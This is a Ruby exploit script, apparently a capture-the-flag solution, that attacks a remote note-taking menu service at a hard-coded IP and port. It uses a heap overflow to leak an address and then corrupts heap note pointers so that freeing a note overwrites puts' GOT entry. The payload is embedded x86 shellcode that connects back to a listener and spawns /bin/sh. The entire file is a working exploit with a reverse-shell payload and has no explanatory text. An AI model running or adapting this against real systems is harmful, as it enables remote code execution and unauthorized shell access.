require 'socket'

#@@s = TCPSocket.new("localhost", 1234)
@@s = TCPSocket.new("54.81.149.239", 9174)
@@id = 0

def do_read(note, expected, size = 10000)
  puts("***#{note}***")
  data = ''
  loop do
    data += @@s.recv(size)
    puts(data)
    if(data.include?(expected))
      return data
    end
  end
end

def send(data)
  @@s.puts(data)
end

def add_note(size = 4)
  do_read("Menu", "choose an option")

  send("1")

  do_read("Size", "give me a size")
  send(size)

  id = @@id
  @@id += 1

  return id
end

def remove_note(id)
  send(2)
  send(id)
end

def edit_note(id, size, data)
  do_read("Menu", "choose an option")
  send("3")
  do_read("ID", "give me an id")
  send(id)
  do_read("Size", "give me a size")
  send(size)
  do_read("Data", "input your data")
  send(data)
end

def print_note(id, expected_size)
  do_read("Menu", "choose an option")
  send(4)
  do_read("ID", "give me an id")
  send(id)
  return do_read(expected_size, "")
end

def quit()
  sleep(2)
  send(5)
  exit
end

def crash()
  # This just causes a crash so I can debug
  puts("*** Causing a crash ***")
  writer = add_note(4)
  owned  = add_note(4)
  edit_note(writer, 40, ("A" * 40))
  remove_note(owned)
end

PUTS_ADDRESS = 0x0804A008

SHELLCODE_SIZE = 200

SHELLCODE = ("\x90" * 30) +
"\x68" +
"\xce\xdc\xc4\x3b" +  # <- IP Number "127.1.1.1"
"\x5e\x66\x68" +
"\xd9\x03" +          # <- Port Number "55555"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02" +
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79" +
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a" +
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f" +
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +
"\xeb\xce\xcc"

# These are used to store shellcode and get the address
reader = add_note(SHELLCODE_SIZE - 16)
read   = add_note(4)

# These are used to overwrite arbitrary memory
writer = add_note(4)
owned  = add_note(4)

edit_note(reader, SHELLCODE_SIZE, SHELLCODE + ("\xcc" * (SHELLCODE_SIZE - SHELLCODE.length)))
result = print_note(reader, SHELLCODE_SIZE + 8).unpack("I*")
SHELLCODE_ADDRESS = result[(SHELLCODE_SIZE / 4)] + 0x0c

result.each do |i|
  puts("0x%08x" % i)
end

puts("ADDRESS = 0x" + SHELLCODE_ADDRESS.to_s(16))

# Overwrite the second note's pointers, via the first
puts("Attempting to overwrite 0x%08x with 0x%08x" % [PUTS_ADDRESS, SHELLCODE_ADDRESS])
edit_note(writer, 24, ("A" * 16) + [SHELLCODE_ADDRESS, PUTS_ADDRESS - 4].pack("II"))

# Removing it will trigger the overwrite
remove_note(owned)

puts("Quitting!")
quit()

add_note(123)

